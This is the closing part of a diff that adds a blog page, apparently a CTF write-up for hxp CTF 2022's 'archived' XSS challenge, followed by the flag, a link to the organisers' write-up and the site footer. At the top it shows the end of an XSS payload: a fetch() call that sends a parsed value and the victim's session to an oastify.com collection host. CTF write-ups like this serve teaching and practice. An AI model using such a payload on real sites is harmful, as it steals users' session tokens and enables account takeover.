+    <span class="nx">fetch</span><span class="p">(</span><span class="s2">`http://uxv39e6gvji5grql1rqnf9y3hunlbmzb.oastify.com/parsed/</span><span class="p">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">archiva_parsed</span><span class="p">)}</span><span class="s2">/session/</span><span class="p">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">session</span><span class="p">)}</span><span class="s2">`</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">mode</span><span class="p">:</span> <span class="dl">'</span><span class="s1">no-cors</span><span class="dl">'</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>flag: hxp{xSS_h3re_Xs5_ther3_X5S_ev3rywhere}</strong></p>
+
+<p>Note 1: After reading the hxp team writeup I realized I could just do the last steps through python which is extremely obvious. 😅 <a href="https://hxp.io/blog/100/hxp-CTF-2022-archived/">hxp-CTF-2022-archived</a></p>
+
+  </div><a class="u-url" href="/2023/03/19/archived.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="https://shafouz.github.io/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">shafouz</li>
+          <li><a class="u-email" href="mailto:jlmacedomatos@gmail.com">contact</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://hackerone.com/shafou" target="_blank" title="hackerone">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#hackerone"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://github.com/shafouz" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/shafouzzzzzz" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/joao-luca/" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
